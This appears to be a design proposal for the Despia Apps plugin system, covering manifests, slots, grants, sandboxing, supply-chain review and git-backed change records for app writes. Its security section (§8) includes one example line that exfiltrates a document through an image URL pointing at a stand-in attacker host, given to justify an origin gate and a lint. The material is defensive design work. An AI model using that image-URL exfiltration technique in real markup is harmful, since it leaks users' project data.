# Despia Apps — third-party and first-party apps for the Studio and the Dashboard

> **Status: PROPOSED v1** (2026-08-28, owner-directed). The execution companion is
> `studio-apps-execution.md` (workstreams T1–T9 with gates); the closed-side shelf/submission/
> signing document is `ClosedSource/Documentation/v4-launch/registry/01-apps-shelf.md`.
> Builds on: the package registry (W1–W6 LANDED — `v4-launch/registry/00-plan.md`, do not
> re-plan it), the facet fan-in (`architecture/facet-contracts.md`), the residence-with-a-seam-list
> pattern (`backend-authoring.md` · `cli-authoring.md` · `mcp-apps.md` §6 — this is the FIFTH run),
> the durability program (`durability.md` — the P1 envelope, the P5 contract gate, and the
> "signed descriptors" shelf row this proposal WAKES), the spend plane (`cost-guardrails.md`),
> the agency ladder + custody law (`v4-launch/product-vision.md` §26, `master-plan.md` law 4),
> and the Studio mandates (`v4-launch/platform/00-vision.md` M1–M6).
>
> **The one-sentence claim:** an app for the Despia platform is an ordinary registry package
> whose manifest declares contributions into a closed slot vocabulary and grants over a closed
> seam list — so the store, the sandbox, the review pipeline and the recursion story are all
> compositions of machinery this repo already ships, and the kernel gains nothing.

Owner decisions recorded 2026-08-28: the product noun is **Apps** ("Despia Apps"; the collision
with the platform's central object — the customer's App — is managed by context, the Shopify
way); v1 is **free-only** (the paid lane is designed and deferred, `01-apps-shelf.md` §6).

---

## 1 · What this is, and why now

Shopify ships non-core features as Shopify apps, written in Liquid, deeply integrated into the
merchant's admin. Despia does the same one level better: the Studio editor is DSX editing DSX,
and the apps are DSX too — the same markup, the same JSE, the same component model, the same
registry a customer's own packages ride. An app can:

- ship an **entire experience** in the Studio (a rail destination with a full work-area pane);
- ship **components into existing panels** (a section in the style panel or the inspector);
- ship a **dashboard card** (the Observe plane);
- expose **tools to agents** (MCP/WebMCP rows derived from its declared actions);
- run **automations** on editor and platform events (a pull request opened, a build finished,
  a release published) — drafting, never auto-publishing, per the agency ladder;
- and be **managed in one place**: the installed-apps panel, where grants, versions, updates,
  dev mode and the kill switch live.

First-party non-core features (the film/advertisement generator, store screenshots, the spend
guard, live logs) convert to apps on the same mechanism, so the grammar is proven by dogfood
before any third party sees it (Article 3: no exemptions).

This is **R3 ("the platform opens") brought forward with an architecture**. `execution-plan.md`
already demands "signing, review, capability disclosure" for third-party publishing (task D5),
and `durability.md`'s shelf row — "Signed descriptors + authority manifests — wakes when
third-party modules ship as artifacts (a marketplace)" — names this program as its wake trigger.
Waking a shelf is a doc change made loudly; this proposal is that change.

## 2 · The law: an app IS a registry package

Nothing about distribution is new. An app is a git repository with a `dsx.json` and bare semver
tags, resolved by `despia add`, pinned in `dsx.lock.json` with the tag's commit SHA and the
canonical tree hash, cached and re-verified on every materialize — the W1–W6 mechanics,
untouched. What makes a package an app is two manifest additions:

1. **`"studioApi": 1`** — the envelope (the `"dsx": 1` pattern, durability P1).
2. **`facets.apps` rows** — contributions into the closed slot vocabulary (§4), each carrying
   its grants (§6) and, for automations, its event bindings (§7).

Two shelves, two trust tiers, one registry:

| Shelf | Trust tier | Review |
|---|---|---|
| Packages (modules a customer's BUILD links) | Q4 stands: no review queue, denylist moderation, listing is not endorsement | a human merges one line |
| **Apps** (units that run inside DESPIA's surfaces with grants) | the R3 tier: mechanical CI gates + **manual human approval** + an **Ed25519-signed approval** over `(coordinate, version, treeHash, grants)` | `01-apps-shelf.md` |

The Studio refuses to mount an unapproved third-party app outside dev mode, with the reason
named. The approval binds the exact tree hash, so "approve then move the tag" yields a signature
that verifies nothing. First-install TOFU — acceptable on the package shelves — is **closed** on
the apps shelf, deliberately: the approval row in the registry's append-only ledger is the
second observer present from install one.

## 3 · The manifest grammar

### 3.1 An app's `dsx.json`

```jsonc
{
  "name": "AcmeCopy",
  "scheme": "acmecopy",
  "version": "1.2.0",
  "summary": "AI copy, on-brand, in the style panel",
  "studioApi": 1,
  "facets": {
    "apps": {
      "copy-panel": {                                   // row key = contribution id, unique per package
        "slot": "studio.rail",
        "component": "Components/CopyPanel.dsx",        // ownComponent — build-checked, no `..`
        "title": "Copy",
        "icon": "text.badge.star",                      // catalog vocabulary; identity marks excluded (§10)
        "grants": ["project:read", "project:write", "net:api.acme.dev"],
        "events": ["document.saved", "selection.changed"],
        "order": "40"
      },
      "tone-section": {
        "slot": "studio.style.section",
        "component": "Components/ToneSection.dsx",
        "title": "Tone",
        "grants": ["selection:read", "project:write"]
      },
      "release-notes": {
        "slot": "automation",
        "on": "platform.release.published",
        "run": "Server/Automations.dsx#draftNotes",     // own document + action; `<server>` grammar
        "mode": "draft",                                // draft | auto — auto needs grant automation:auto
        "grants": ["automation:deploy", "net:api.acme.dev", "secret:ACME_KEY"]
      }
    }
  }
}
```

### 3.2 The word, and who owns it

A new open module **`Core/Apps`** (scheme `apps`) registers the facet word `apps` in the
object form — the Legacy/Import pattern, the third first-party consumer of the fan-in:

```jsonc
"facet": { "word": "apps", "declarations": {
  "key": "contribution",
  "fields": {
    "slot":      { "type": "string", "required": true },
    "component": { "type": "ownComponent" },
    "title":     { "type": "string" }, "icon": { "type": "string" }, "order": { "type": "string" },
    "grants":    { "type": "object" }, "events": { "type": "object" },
    "on":        { "type": "string" }, "run": { "type": "string" }, "mode": { "type": "string" }
  },
  "emit": "StudioApps"
}}
```

The word `app` (singular) is TAKEN — `Mandatory/App` binds it (`facet-contracts.md`, the
registered set) — and `apps` collides with no shipped scheme (verified 2026-08-28). `Core/Apps`
rather than the Editor owns the word because the grammar must be **public**: third-party authors
validate against it with the open CLI, the shelf CI runs the open CLI, and `Custom/Editor` is
shelf-premium. The Editor is a consumer of the aggregate, like every surface.

### 3.3 Two validators, one corpus

In-tree first-party app modules validate through `DSXGraph`'s existing facet-declaration
machinery (abort tier). Installed registry packages validate through a TS reader
(`packages/cli/src/studio-apps/manifest.ts`). Both are driven by
`OpenSource/Conformance/studio-apps/manifest.json` — the `lint_conformance.rb` shared-fixture
pattern — so the two cannot drift. Abort-tier rules: unknown slot, unknown grant, unknown event
id, `run` path escaping the package, `component` not owned by the package, and
**grants⊆slot-legal** — an `automation` row may not hold `project:write`; a UI row may not hold
`automation:*`.

## 4 · The slot vocabulary v1 — CLOSED, seven entries

| Slot | What mounts | Why this one |
|---|---|---|
| `studio.panel` | a docked 340px column beside the live preview, promotable to the full window by a host-drawn control | THE DEFAULT PLACEMENT. The person keeps working with the app open, which is the only reason they keep it open; preview + agent + app at once is the shape Webflow and Framer settled on |
| `studio.rail` | a rail row + a full work-area pane (shadow-isolated) | "apps ship entire experiences"; the rail is already the Studio's destination grammar |
| `studio.inspector.section` | a collapsed section in the inspector, selection-scoped | "a component in the panel"; sections are the inspector's existing unit |
| `studio.style.section` | a section in the style panel | the style plane is where component vendors live; lands WITH the panel finally rendering `<override>` typed controls, so one section grammar is built once |
| `dashboard.card` | a card on the dashboard home | the Observe plane (product-vision §6); `SpendGuard.dsx` is the proven card shape |
| `tool` | a `<tool>` row projected into the project's MCP/WebMCP table | agents are a first-class consumer (`webmcp.md`); reuses the `facets.mcp` derivation rules — descriptors derive from declared actions, never a `schema` field |
| `automation` | no UI; an event-driven action (§7) | "apps handle data events" |

No v1 slot is single-occupancy: rail rows append (with overflow), sections stack by
(`order`, install time) — the slot-collision failure class is dissolved by vocabulary choice.

### 4.1 · Placement — the side panel is the default (owner-directed 2026-08-28)

An app that takes the whole window every time it opens is an app nobody keeps open. The work
a plugin does is BESIDE the work you are doing — that is the shape Shopify, Webflow, Framer
and Figma all converged on, and it is the shape our own surfaces already have. So the rail
carries two placements, and the manifest word chooses:

| slot | what it is | when |
|---|---|---|
| `studio.panel` | a docked 340px column beside the work area — the live preview keeps rendering to its left, the agent keeps its pane, the stage yields | **the default.** Anything that annotates, inspects, generates into, or reports on what the person is already doing |
| `studio.rail` | the work area itself | an app that genuinely IS a destination: a board, a canvas, a whole editor |

Both mount through one `StudioAppSurface` and one fold; `resolveStudioApps` sorts them into
`panels` and `rail` lanes and the shell renders by data, never by a branch per app. The
placement is not a cage: the host draws EXPAND on a docked panel (promote it to the work
area) and DOCK on a promoted one (put it back), so a person moves an app between placements
without the app participating. Both controls live in the provenance strip, in host DOM,
outside the app's shadow root — an app can no more draw over its own placement controls than
over its own name.

The panel takes **340px, the width the navigator and the inspector already take**: the Studio
has one panel width, and a third number would read as a third kind of thing. Content inside a
`SidePanel` caps at a 720px measure, so promoting to the full window widens the surface
without stretching a form across it.

**Deferred, each with its wake trigger** (a shelf is a trigger, not a no): `studio.canvas.overlay`
(wakes on the first first-party need — none of Films/Shots/Spend needs it);
`dashboard.desk` (wakes with the E2 control-plane wave — desks are fixtures today); `command`
palette (wakes when the Studio grows a palette); `store.detail` live components (**refused**, not
deferred — third-party code executing on the public registry site is a drive-by-XSS product;
store pages carry static media only, produced by `despia shot`).

Adding a slot is a minor, additive `studioApi` change. Removing or renaming one is the major.

## 5 · The `studio` residence — the fifth seam list

An app's logic is JSE — an interpreter over a closed statement grammar with no import, no
process, no member access into host objects. "Co-tenantable by construction"
(`backend-authoring.md` §3) is the sandbox; the seam list is the reach. The scoped table
(`packages/cli/src/studio-apps/scope.ts`, the line-for-line sibling of
`server/src/actions.ts#moduleTable` and `cli/src/declared.ts#moduleTable`) is handed to every
app mount through the kernel's existing `RunEnv.callModule` funnel:

| Chain | Gate | Backed by |
|---|---|---|
| `studio.project.list` / `.read` | `project:read` | `GET /edit/api/documents…` (same-origin, admission cookie) |
| `studio.project.edit` | `project:write` | THE surgery door `POST /edit/api/edit/<doc>` — revision-checked splices, checkpoint-on-write, provenance `app:<scheme>` per turn |
| `studio.project.create` | `project:write` | the whole-document door `PUT /edit/api/documents/<doc>` (parse-checked, containment-checked) — the STRUCTURAL verb, so it lands as a proposal and a pull request (§14), never as a silent write |
| `studio.catalog.elements` / `.styles` / `.graph` | `project:read` | `/edit/api/elements` · `/edit/api/styles` · `/edit/api/graph` |
| `studio.selection.get` | `selection:read` | host-held selection state |
| `studio.ui.toast` | ambient | host chrome renders it, stamped with the app's name |
| `app.storage.get/set/remove/list` | ambient, namespaced | `.despia/apps/<scheme>/storage.json` via `/edit/api/apps/storage/<scheme>` — an app cannot name another app's namespace |
| `fetch` / `<api>` | `net:<host>` grants | `RunEnv.egress` → the one fetch funnel; suffix-match host rule verbatim from the server's egress gate |
| anything else | `forbidden` / `unknown_action`, naming the missing grant | the closing arm |

Three laws ride the table:

- **Fail-closed at the seam, never at the dialog.** An ungranted call refuses with the grant
  named even if an install dialog was bypassed, patched, or replayed.
- **Budgets are ceilings.** Per entry (event delivery or user interaction): `loopCap` /
  `deadlineMs` / `calls` clamps an app may lower and never raise (defaults measured before
  pinning, recorded in the contract artifact).
- **The table is a contract artifact.** `OpenSource/Web/support/studio-api-v1.json` pins the
  seam list, the slot vocabulary, the grant vocabulary, the event ids and the budget defaults;
  a `public-api-contract`-style test guards it. Additions are additive within `studioApi 1`;
  removals force the major. The refusal vocabulary is the frozen error-system set — no new codes.

**Two write doors, one write plane.** A splice goes through the surgery endpoint and a new
document through the whole-document endpoint — the same two doors the panels and the source
pane use, both revision-checked, both parse-checked, both containment-checked. Everything that
passes either one is attributed `app:<scheme>` and joins a change set (§14), so "what changed
my project" has one answer and one undo.

## 6 · Grants — what an install shows, what a seam checks

The vocabulary, closed, with the install-dialog copy it renders (the dashboard-concept §3.3
package dialog grows a Permissions block; the Studio's install flow shows the same rows):

| Grant | Dialog copy |
|---|---|
| `project:read` | Read this project's documents and catalogs |
| `project:write` | Edit this project — every change lands as its own commit you can revert, and anything that reshapes the project arrives as a pull request (§14) |
| `selection:read` | See what you have selected |
| `net:<host>` | Send data to `<host>` (one row per host) |
| `secret:<NAME>` | Uses a key you configure; stored in your deployment, never sent to Despia |
| `automation:deploy` | Adds automations to your server deployment (the named events, routes and egress hosts) |
| `automation:auto` | May act without a per-run confirmation — off by default (the policy-autonomy rung) |
| `data:<entity>` | Automation plane only, per entity, loud |

Ambient (listed as "always available, sandboxed"): namespaced storage, toast, its own pane.

**Consent is an act, not a button label.** The install column renders the rows above and then a
sentence a person agrees to — *"I agree that Palette may use the 2 permissions above in this
project"* — and the enable control stays inert until they have. The seam enforces the grants
either way; the checkbox exists because a dialog whose only gesture is the button that grants is
a dialog people click through. The recorded consent (`grants`, `grantedAt`) is what the fold
reads, so an app whose manifest later asks for more is held until the person agrees again.

Grants are **manifest-static** — there is no runtime widen verb, no subscribe verb, nothing an
app can call to grow its reach. They are recorded per project (`.despia/apps/grants.json`),
hashed into the lockfile row, and hashed into the signed approval. A hosted install additionally
writes the A2 consent-ledger record (master-plan law 3). An update whose grants differ from the
recorded hash keeps the app on the old version until the person re-consents, with the diff
rendered ("asks for 2 new permissions").

## 7 · Events — two planes, one agency ladder

### 7.1 Editor-session events (local-first, no account)

A closed list, v1: `document.saved · document.opened · selection.changed · build.finished ·
lint.finished · deploy.requested · deploy.finished · app.installed · app.enabled ·
app.disabled`. Subscription is the manifest (`events` on a contribution row); delivery invokes
the app's declared handler action through the scoped runner, one entry per event, budgeted.
Payload shapes are corpus-pinned (`studio-apps/events.json`). Everything on this plane works
with `despia edit` on a laptop, offline, no account — the local-first law.

### 7.2 Platform events and the `<automation>` document

Platform events (`platform.release.published · platform.pr.opened · platform.build.finished ·
platform.order.created`) originate at the platform server's existing webhook plane
(`platform_events` queue + drain worker, `Custom/Platform/web/server/platform.dsx`) and the P6
GitHub App — both owner-gated to deploy. An `automation` row's `run` names an action in an
app-owned document written in the `<server>` grammar:

```xml
<server>
  <secret as="ACME_KEY"/>
  <egress host="api.acme.dev"/>
  <automation on="platform.release.published" run="draftNotes" mode="draft"/>
  <action as="draftNotes" inputs="release"> …JSE… </action>
</server>
```

**Where automations run is the custody law's answer:** `despia build` compiles granted
automations INTO THE INSTALLING USER'S OWN server artifact, deployed to their own account. The
app vendor runs no infrastructure; Despia executes nothing and stores doorbells, not data — the
platform only fans out signed event deliveries the person consented to. The automation seam list
is the server document's, narrowed: `secret.read` (install-configured), granted egress,
namespaced server-side `app.storage`, its own queue; `data:<entity>` only by explicit grant.
Spend-plane guarded defaults apply unmodified — an automation cannot declare a `<budget>` above
the deployment's ceilings.

`mode="draft"` is the default and the floor: an automation prepares an artifact and notifies;
it never publishes ("draft, never auto-publish" — `12-marketing-video.md` §37, product-vision
§26). `mode="auto"` requires the `automation:auto` grant, off by default. Every run writes a
ledger row (local log; hosted, the consent ledger) — authorized, attributable, logged,
understandable, reversible.

## 8 · The runtime — mount, scope, isolation

- **Per-app sub-registry.** The app's components (its `Components/`, StudioKit, its declared
  package dependencies) compile through the browser-safe `compileComponent` into a registry of
  their own; `resolveComponent` takes the registry as an argument, so the app resolves only its
  own scheme plus declared dependencies. It cannot name, shadow, or reach a first-party
  component; a shipped tag of the same name is unreachable rather than contested. Scheme
  collisions refuse at `despia add` (the index's reserved set + the lockfile's taken map);
  scheme `dsx` refuses at the compiler.
- **The mount is the facet-component mechanism.** `Core/Apps`' web facet registers ONE facet
  component, `StudioAppSurface` (shadow isolation — `isolation:"shadow"` — the
  `@despia/element` embed pattern minus the custom-element wrapper). The host draws a
  provenance strip ("App · AcmeCopy") the app cannot draw over; the surface's fallback children
  render when the app is absent, disabled, killed or skewed (the unresolved-tag degradation,
  Article 7 for free).
- **The scoped handle.** `instantiate()` in `packages/dom` gains an `env` option
  (`callModule` · `egress` · `ownerScheme` · budgets) threaded into `makeRunEnv` AND inherited
  through nested component expansion — without the inheritance hop, a child component of an app
  pane would silently fall back to the process-global registry, which would void the whole
  containment story. This is the one real runtime change, and it is packages/dom, not kernel.
- **The src-attribute origin gate.** The fetch funnel gates `fetch`/`<api>`, but
  `<image src="https://evil.tld/x?leak=…">` is fetched by the BROWSER — an app with
  `project:read` and zero granted hosts could exfiltrate a document through an image URL. The
  app mount therefore refuses src-class attributes (static and bound) that are not
  package-relative or granted-origin, and the app lint bans remote literals in app markup at
  build and at shelf CI — the `ai_package_gate.rb` discipline ("a URL literal is a declared
  network path, in a diff someone reviews") applied at the residence.
- **The seam scan.** The compiler's `viewSeamViolations` (mcp-apps) grows a `studio` profile:
  network verbs outside the granted funnel, iframe/webview tags, and remote src literals are
  build errors with the fix named.
- **Containment beyond observation.** App errors attribute via `ownerScheme` into the error
  ledger; three consecutive mount failures auto-disable the app with the reason shown in the
  installed-apps panel. The blast wall is the shadow root: the host chrome never dies with a
  pane.

## 9 · The kernel question, answered with the five questions

The owner's instinct — "the plugin system should not be kernel; a registry only if it must be" —
is confirmed by measurement, and it is stronger than expected: **`packages/kernel` gains
nothing.** The runtime-pressure procedure, answered:

1. *The observable:* a rendered surface cannot hand a mounted subtree a restricted module reach.
2. *The issue behind it:* it can — the seam exists (`RunEnv.callModule`, the overridable module
   funnel, landed with the backend program as "the only kernel change the server-authoring
   program needs") — but only the server and CLI hosts set it; the DOM mounter never threads it.
3. *Where we limited too much:* `packages/dom` `instantiate()` builds `makeRunEnv` internally
   with no env option, and nested component expansion inherits only `component`/`frameId`.
4. *The opening move:* thread an `env` override through `instantiate` and the nested expansion —
   a packages/dom change, corpus-gated, no new kernel vocabulary. The restrictions that stay
   (the seam list itself, the egress allowlist, the fail-closed grants) are load-bearing and
   remain.
5. *Implemented properly:* fixtures first (`Conformance/studio-apps/`), the DOM suite + a
   browser oracle, and no workaround anywhere — the server and CLI tables are untouched priors,
   not parallel behaviours.

Everything else is modules, packages and tooling: `Core/Apps` (the word + the host facet
component), the scoped table and sub-registry compiler in `packages/cli`, the editor and
dashboard markup, StudioKit, the shelf. The registry stays out of the kernel entirely.
`durability.md`'s rejection of runtime capability handles for the MODULE plane ("one process,
one signed binary — no enforcement boundary") is not contradicted: the app plane HAS an
enforcement boundary — the interpreter — and the grants gate an interpreter seam, not a native
module. `ModuleRegistry` needs no unregister/provenance because **apps never register on the
bus**: the scoped funnel is their entire reach, so uninstall is the host dropping a table entry.

### 9.1 · An interface is one consumer — the headless faces (owner-directed 2026-08-28)

The Studio is ONE consumer of an app, never the app's boundary. First- and third-party ride one
model, so every installed app is fully drivable with no surface at all — from the terminal and
from an agent over MCP — and the mechanism is the same mechanism, not a parallel one:

- **The grammar says it.** A `tool` row names its published `action` AND its implementation —
  `run="Server/Tools.dsx#action"`, the automation row's shape — in the same narrowed document
  grammar (§7.2: actions, secrets, egress; nothing else). A tool without `run` refuses at the
  manifest tier (`missing_run`): a tool locked into an interface is not a tool. One action can
  carry every face — the Marketing Studio's `draftFilm` is its release-published automation AND
  its CLI/MCP tool, one body, three triggers.
- **The CLI face.** `despia app tools` lists every installed app's tools with their declared
  inputs (a held tool is listed WITH its hold — a tool that vanishes when disabled reads as a
  broken toolchain); `despia app run <scheme> <tool> --args '{…}'` invokes one. The runner is
  the kernel (`ActionRunner`, the app-plane budgets), the funnel is the same seam table a
  mounted surface gets, and the doors are the edit mount invoked in-process — document
  containment, revision checks, storage namespacing and the `app:<scheme>` provenance ledger
  are the same code, not a twin. Headless divergences are typed, never faked: selection reads
  null, toast prints stamped to stdout, there is no event lane (an invocation IS one entry),
  and storage writes FLUSH before exit (a mounted surface may write through lazily; a process
  that exits may not).
- **The MCP face.** The toolchain's MCP server projects every installed app's tool rows as
  first-class tools beside its own — `app_<scheme>_<action>`, descriptions from the manifest,
  input schemas from the action's declared inputs. Install an app and every connected agent's
  toolbox grows; disable it and the tool says so. Calls land in the same headless runner.
- **One corpus, N funnels.** The seam table now has two implementations — the module-owned web
  funnel (`Core/Apps/web/scope.js`, mounted surfaces) and the CLI's headless twin
  (`packages/cli/src/studio-apps/headless.ts`) — and both run against
  `Conformance/studio-apps/scope.json` per PR, the two-validators-one-corpus pattern the
  manifest grammar already lives under. A consumer added later (the dashboard's server-side
  face, the hosted studio) joins the same corpus or does not ship.

Grants do not care which face called: the consented set gates the seam per call, headless or
mounted, and a held app (disabled, widened manifest awaiting re-consent) refuses identically
everywhere.

## 10 · Security model

- **Sandbox:** JSE's closed grammar (no import, no process, no globalThis, no member access into
  host objects — not by policy but by construction) + the closed seam table + budgets. The same
  argument that makes third-party `<server>` bodies co-tenantable.
- **Reach:** grants manifest-static, hashed into lockfile + approval, checked per call at the
  seam. Events manifest-static. No widen verbs exist.
- **Exfiltration:** the fetch funnel for calls, the src-origin gate for markup-initiated loads,
  the remote-literal lint for what review reads.
- **Spoofing:** apps render only inside provenance-stripped shadow roots; grant and consent
  dialogs render in host chrome exclusively; toasts are stamped; the icon vocabulary excludes
  the rail's identity marks (the "marks are IDENTITIES" rule, enforced by the manifest
  validator); an app cannot draw over host chrome from inside a shadow root.
- **Supply chain:** commit + tree-hash pins, the append-only hashes ledger, approval bound to
  the tree hash, cache re-verified on every materialize, retag refusal. TOFU closed on the apps
  shelf (§2).
- **Review pipeline:** submitted code never executes at review (compile and lint only;
  `pull_request_target` stays banned); READMEs and descriptions are untrusted text that changes
  no policy; approval signing is owner-local, post-merge, the key never in CI.
- **Kill switch:** denylist/yank propagate on index refresh; a killed app unmounts with the
  recorded reason and never bricks the editor (Article 7); its automations drop from the NEXT
  `despia build` loudly. Existing customer deployments are theirs — the custody law means we
  cannot and do not reach in.

## 11 · The recursion law — the editor that edits the editor that runs the app

The Studio authors the Studio (M6), the Studio is DSX (M1), and apps are DSX — so the app
system itself is editable in the editor, including the panel that manages apps. What keeps the
snake from eating itself is one distinction:

- **An installed app runs its PINNED tree** — the lockfile's verified bytes (materialized by the
  same `lockedModuleDirs` the export path uses), the version the approval signed.
- **The editor edits a WORKING tree.** Dev mode mounts the working tree into the same slots with
  the same scoped bus through a per-app hot-swap (the `__DSX_SWAP__` shape, scoped to one
  sub-registry), badge shown. A self-broken save fails the remount typed while the pinned
  install keeps running. Only `despia add` moves a pin.

So you can open the Studio in the Studio, edit the app that extends the Studio, and watch it
run in the Studio you are editing — and none of it can take down the Studio you are standing
in, because what is mounted and what is edited are different trees by construction.

**Version skew** is the envelope: the host exports `STUDIO_API = 1`; an app pinning a different
major refuses to mount per-contribution with the reason shown ("built for Studio API 2; this
Studio speaks 1") — typed, never a blank pane. Within a major, changes are additive only; the
pinned contract artifact + `contract_diff.rb` on in-tree manifests police it.

## 12 · First-party apps — the dogfood is the proof

Conversion order: **Films/Shots** (the advertisement generator — the Distribution rail, the
film automation of `12-marketing-video.md` §37 expressed in §7's grammar), then **Spend Guard**
(`dashboard.card` + a Studio row), then **Live Logs**. Each becomes an app module whose
`facets.apps` rows are the ONLY way its surfaces reach the rail, the panels and the dashboard.
Preinstalled first-party apps appear as "built-in" rows in the installed-apps panel and can be
disabled there.

One mechanism, honestly stated (Article 3): one slot table, one contribution grammar — the
Editor declares its own ten destinations as `facets.apps` rows and they arrive through the same
fold an installed app rides. First-party panes stay in the boot registry rather than per-app
sub-registries; that difference is a build fact (bundled vs installed), like bundled-floor vs
OTA, not a privilege. The rail's ten identities stay census-pinned through the move.

## 13 · The mandatory UI kit

`OpenSource/StudioKit` — **eighteen components plus the unscoped class vocabulary they are
built from** (`kit.css`, declared `web.styles`, folded into the `dsx-theme` layer of every
app's sub-registry). Both halves matter: a kit that shipped only components is a kit an author
cannot extend, and the first time they need a shape it did not anticipate they invent one —
which is how a second design system ends up inside somebody else's package. Here the
components and the author's own markup speak one vocabulary.

| | |
|---|---|
| scaffolds | `SidePanel` `RailPane` `Section` `Toolbar` |
| structure | `PanelHeader` `PropertyRow` `Field` `Card` `Row` `Divider` |
| controls | `Button` (primary · quiet · danger) `Segmented` `Select` |
| marks | `Chip` `Badge` `Stat` |
| states | `EmptyState` `Toast` |

The law an app's styling lives under:

- **Tokens only.** An app's sheets may reference kit/`--dsx-*` tokens and nothing literal — the
  dashboard's E006 rule and the editor's `check_editor_dogfood` discipline, shipped as an OPEN
  TS lint (submitters and the shelf CI cannot run closed ruby).
- **The ladders.** The editor's space/type/control/radius rungs apply to app markup.
- **Kit-first composition**, the icon vocabulary, the remote-literal ban, and a byte budget on
  the compiled sub-registry.

`despia review --app` (the app lint tier) runs all of it locally; the shelf CI runs the same
commands. Ejection is not offered inside Studio chrome — an app that fights the fabric is an
app the review refuses.

## 14 · The change plane — an app write is a version, not an event

An app that can edit a project can break one. The answer is not to make writes rarer; it is to
make every write **recoverable, attributed and reviewable**, so that letting a stranger's app
touch your documents is a decision you can undo rather than one you have to trust.

**An app write never lands alone.** It joins a CHANGE SET, the set is CLASSIFIED, and the
classification decides where it lands:

| | what it is | where it lands |
|---|---|---|
| **local** | an in-place edit of up to `fanOut` documents on a branch you are working on | its own commit on that branch, scoped to exactly the files the app touched |
| **structural** | a document added or removed, a fan-out past the limit, or any write while on a protected branch | a branch of its own (`despia/app/<scheme>/<change>`) plus a pull request — and your working branch goes back to how it was |

An app that reshapes the project **proposes**; a person merges. That is the whole idea, and it
is why `studio.project.create` is on the seam list at all: the structural lane needs a
structural verb, and the verb is only safe because the lane exists.

### 14.1 The change set

A set opens on an app's first write and closes when the burst goes idle (1.2s) or when the
process that opened it ends — `despia app run` flushes before it returns, because a burst left
open is a commit that never happened. One button press in a panel is one change, not five.

Every set carries the **pre-change bytes of every document it touched** (the first bytes win
inside a burst), so recovery never depends on git being there:

```
.despia/apps/history/<id>.json   { id, app, at, kind, reasons, title, documents,
                                   before, branch, commit, pull, pushed, note,
                                   revertedBy, reverts }
```

`despia app history` and the Apps panel's **Changes** tab read the same records, and both
offer the same one control: **Revert**. A revert restores the bytes, removes what the app
created, and is itself a recorded, attributed change — undoing an app is as legible in the
history as the app was.

### 14.2 The commit sentence

```
palette: add Screens/Pricing.dsx

- adds Screens/Pricing.dsx to the project

Despia-App: palette@0.3.0
Despia-Change: 09m4x1k2p-1-palette
Despia-Kind: structural
```

The trailers are the machine half of provenance: `git log --grep 'Despia-App: palette'`
answers "what has this app ever done to my project", and the change id ties the commit back to
the record that can revert it. The commit is **path-scoped** (`git commit -- <paths>`), so a
person's own work in flight is never swept into an app's commit.

### 14.3 The ladder, and the fail-open law

Article 7 governs the whole plane. No rung refuses the edit; each one degrades to the next and
writes what happened into the record's `note`, because a person told "committed locally, not
pushed — no origin remote to back up to" can act, and a silent failure is how a backup plane
becomes a lie.

1. **commit** — the project is a git repository → the change is a commit.
2. **push** — a remote exists and the policy allows → the branch is pushed. That is the backup.
3. **pull request** — `gh` is installed and authenticated (the person's own credential, never
   one this plane stores or asks for) → a real pull request, with the reasons in its body.
4. **the link** — no credential, but a GitHub remote → the compare URL, one click from the
   pull request.
5. **none of it** — no repository at all → the change is applied in place, and the record still
   holds the bytes, so the panel's Revert works exactly as it does everywhere else.

### 14.4 The policy is the project's, not the app's

`.despia/apps/vcs.json`, defaults in the open:

```jsonc
{ "commit": true, "push": "structural", "remote": "origin",
  "protected": ["main", "master", "trunk", "release"], "fanOut": 3, "pullRequests": true }
```

`push: "structural"` is the default because a branch that carries a pull request MUST reach the
provider, while everything else stays local until a person pushes their own work — pushing is
an outward-facing act on someone else's account. "Back up every app change" is one switch away
in the panel (`push: "always"`). A hand-edited file cannot widen the plane by writing nonsense:
an unknown `push` value reads as the default, not as the widest one.

**Committing is NOT a grant.** No app asks for it, no app can turn it off, and no app knows it
happened. The HOST commits on the app's behalf, which is exactly why the record can be trusted:
an app that could choose its own provenance would have none.

### 14.5 What this buys, said plainly

- *"When a plugin edits something, it should be recoverable."* — every write, byte-for-byte,
  with or without git, from the panel or the CLI.
- *"Something that breaks the project structure has to go through a proper GitHub PR."* — the
  structural lane, and the four cases that enter it are mechanical, corpus-pinned, and visible
  in the change record's `reasons`.
- *"Every time the plugin does something it should count as a commit."* — one burst, one commit,
  with the app and its version in the trailer.
- *"Secure backups on the user's Git provider."* — the push rung, on the person's own remote
  with the person's own credentials. Despia is never in the path.

Corpus: `OpenSource/Conformance/studio-apps/vcs.json` (classifier · policy reader · titles ·
the commit sentence · the slug), single-runner, plus real-repository tests in
`packages/cli/test/studio-apps-vcs.test.ts` that cut actual git repositories and read the log
back — "it committed" is a claim about git, not about a mock.

## 15 · Platform scope and Article 10

v1 surfaces are the **web Studio and the web Dashboard** — product surfaces, not store
binaries, so the store-policy line ("not a remote runtime": no generic host app loading
arbitrary user code) is respected by scope. The app grammar itself is renderer-neutral by
construction (DSX over primitives — components run everywhere by construction), and the
conformance corpora are the law any future surface must satisfy. Native/mobile surfacing
(Despia Mobile cards, native Studio) is deferred to the `<MiniApp/>` scoped-bridge trust tier
already named in `web-surface-policy.md` §7 — its own proposal, waking when R2 wants
third-party cards in a store binary. Single-runner corpora carry the spend-precedent README
("the plane has one runtime"); the manifest and approval corpora run on two validators from
day one because grammar and canonical bytes are exactly where N implementations drift.

## 16 · The edge-case ledger

| Case | The designed answer |
|---|---|
| App crashes / fails to mount | typed failure card inside its own shadow root; host chrome intact; errors attributed via `ownerScheme`; three consecutive mount failures auto-disable with the reason shown |
| Malicious markup | closed JSE grammar; the `studio` seam scan at build AND shelf CI; src-origin gate at mount; iframe/webview tags refused |
| Capability escalation | grants manifest-static, hashed into approval + lockfile, checked per call; no runtime widen/subscribe verbs exist |
| Shadowing first-party schemes/components | per-app sub-registry; reserved scheme set at the index; `dsx` refused at the compiler; duplicate-scheme install refused |
| Two apps claim a slot | no v1 slot is single-occupancy — rows append, sections stack by (`order`, install time) |
| Update widens grants | exact-pin lockfile; grant-diff vs recorded hash holds the old version until re-consent, diff rendered |
| Uninstall | unpin + drop grants; `.despia/apps/<scheme>/storage.json` kept by default with a prompt naming the path; cache keeps package bytes (offline re-add stays free) |
| Offline / local-first | install from cache with re-verify; approval verifies offline (bundled pubkey, the entitlement precedent); index unreachable ⇒ TOFU warning + `crossChecked:false`; editor events fully local; platform events typed-absent |
| Killed / denylisted app | unmounts with the recorded reason on index refresh; never bricks; automations drop from the NEXT build loudly; deployed customer artifacts are theirs |
| Editor-version skew | `studioApi` refusal per-contribution, shown not silent |
